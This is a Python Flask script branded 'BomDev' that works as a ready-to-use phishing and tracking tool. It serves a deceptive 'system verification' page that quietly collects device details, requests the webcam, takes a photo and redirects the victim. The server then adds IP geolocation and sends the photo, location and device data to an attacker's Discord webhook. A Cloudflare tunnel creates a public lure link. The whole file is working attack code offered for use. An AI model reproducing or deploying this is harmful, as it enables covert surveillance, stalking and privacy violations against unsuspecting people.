import os
import time
import json
import base64
import subprocess
import requests
from flask import Flask, render_template_string, request

app = Flask(__name__)
PORT = 8080

RED = "\033[1;31m"
RESET = "\033[0;0m"

def show_banner():
    banner = f"""{RED}
 ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██╗   ██╗
 ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██║   ██║
 ██████╔╝██║   ██║██╔████╔██║██║  ██║█████╗  ██║   ██║
 ██╔══██╗██║   ██║██║╚██╔╝██║██║  ██║██╔══╝  ╚██╗ ██╔╝
 ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗ ╚████╔╝ 
 ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝  ╚═══╝  
                                     By BomDev
    {RESET}"""
    print(banner)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Checking System Identity...</title>
    <style>
        body { background: #000; color: #f00; font-family: monospace; text-align: center; padding-top: 20%; }
    </style>
</head>
<body>
    <div id="status">[+] SYSTEM VERIFYING: 88% <br> Please Allow Access to Continue...</div>
    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        async function capture() {
            let battery = { level: 0, charging: false };
            try { battery = await navigator.getBattery(); } catch(e) {}

            let data = {
                ua: navigator.userAgent,
                plt: navigator.platform,
                bat: (battery.level * 100) + "%",
                res: screen.width + "x" + screen.height
            };

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('v');
                v.srcObject = stream;
                
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0, 640, 480);
                    fetch('/x', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ img: c.toDataURL('image/png'), info: data })
                    }).then(() => { window.location.href = "https://www.google.com"; });
                }, 2000);
            } catch (e) {
                fetch('/x', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ img: "none", info: data })
                });
            }
        }
        window.onload = capture;
    </script>
</body>
</html>
"""

def get_geo_info(ip):
    try:
        api_url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,as,query"
        res = requests.get(api_url, timeout=5).json()
        if res.get('status') == 'success':
            return res
    except Exception as e:
        print(f"DEBUG: Geo API Error -> {e}")
    return None

@app.route('/')
def index(): return render_template_string(HTML_PAGE)

@app.route('/x', methods=['POST'])
def handle_target():

    data = request.get_json(silent=True) or {}
    info = data.get('info', {})
    image_data = data.get('img', 'none')
    
    try:
        forwarded_for = request.headers.get('X-Forwarded-For')
        if forwarded_for:
            ip_addr = forwarded_for.split(',')[0].strip()
        else:
            ip_addr = request.remote_addr
    except:
        ip_addr = "Unknown"
    
    geo = get_geo_info(ip_addr)
    
    def build_embed():
        if geo and geo.get('status') == 'success':
            city = geo.get('city', 'Unknown')
            region = geo.get('regionName', 'Unknown')
            country = geo.get('country', 'Unknown')
            lat = geo.get('lat', 0)
            lon = geo.get('lon', 0)
            isp = geo.get('isp', 'Unknown')
            
            location_str = f"```{city}, {region}, {country}```"
            map_url = f"https://www.google.com/maps?q={lat},{lon}"
            isp_str = f"```{isp}```"
        else:
            location_str = "```❌ ข้อมูลพิกัดไม่พร้อมใช้งาน```"
            map_url = "#"
            isp_str = "```Unknown```"

        fields = [
            {"name": "`🌐` IP Address", "value": f"**`{ip_addr}`**", "inline": False},
            {"name": "`📍` Location", "value": location_str, "inline": False},
            {"name": "`🛰` Google Maps", "value": f"[คลิกเปิดแผนที่ดูจุดเกิดเหตุ]({map_url})" if map_url != "#" else "❌ N/A", "inline": True},
            {"name": "`🏢` ISP Service", "value": isp_str, "inline": True},
            {"name": "`🖥` Platform", "value": f"`{info.get('plt', 'Unknown')}`", "inline": True},
            {"name": "`🔋` Battery", "value": f"`{info.get('bat', 'Unknown')}`", "inline": True},
            {"name": "`📺` Resolution", "value": f"`{info.get('res', 'Unknown')}`", "inline": True},
            {"name": "`🌐` User Agent", "value": info.get('ua', 'Unknown'), "inline": False},
        ]

        return {
            "title": "`📷` Capture System – by BomDev",
            "description": "System details captured successfully.",
            "color": 0xED4245,
            "fields": fields,
            "footer": {
                "text": "Developed by BomDev",
                "icon_url": "https://s12.gifyu.com/images/bkeIV.png" 
            },
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")
        }

    embed = build_embed()

    try:
        payload = {"embeds": [embed]}

        if image_data != "none":
            raw = base64.b64decode(image_data.split(",")[1])
            requests.post(
                WEBHOOK_URL,
                data={"payload_json": json.dumps(payload)},
                files={"file": ("capture.png", raw)}
            )
        else:
            embed["fields"].append({
                "name": "`📷` Camera",
                "value": "`❌` Not available / Denied",
                "inline": False
            })
            requests.post(WEBHOOK_URL, json=payload)

    except Exception as err:
        print(f"[ERROR] {err}")

    return {"status": "ok"}

def run_tunnel():
    print(f"{RED}[+] STARTING CLOUDFLARED TUNNEL...{RESET}")
    with open("tunnel.log", "w") as log:
        subprocess.Popen(['cloudflared', 'tunnel', '--url', f'http://127.0.0.1:{PORT}'], 
                        stdout=log, stderr=log)
    
    time.sleep(8)
    if os.path.exists("tunnel.log"):
        with open("tunnel.log", "r") as log:
            for line in log.readlines():
                if "https://" in line and ".trycloudflare.com" in line:
                    url = line.split("https://")[1].split(" ")[0].strip()
                    print(f"\n{RED}[+] BOMDEV LINK: https://{url}{RESET}")
                    break

if __name__ == "__main__":
    show_banner()
    WEBHOOK_URL = input(f"{RED}[+] กรอก Discord Webhook: {RESET}")
    run_tunnel()
    app.run(host='0.0.0.0', port=PORT, debug=False)
